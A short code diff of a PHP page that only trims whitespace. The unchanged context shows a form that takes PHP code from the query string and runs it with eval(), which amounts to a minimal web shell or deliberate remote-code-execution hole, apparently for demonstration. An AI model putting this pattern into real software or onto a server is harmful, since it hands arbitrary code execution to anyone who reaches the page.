@@ -8,26 +8,14 @@
             <label>Enter PHP CODE : </label>
             <input type="text" name="php_code" />
             <input type="submit" value="Execute" />
-            
-            
         </form>
-        
-        
+    
     </body>
-    
-    
 </html>
-
 
 
 <?php
     if (isset($_GET['php_code'])){
         eval($_GET['php_code']);
     }
-
-
-
-
-
-
 ?>
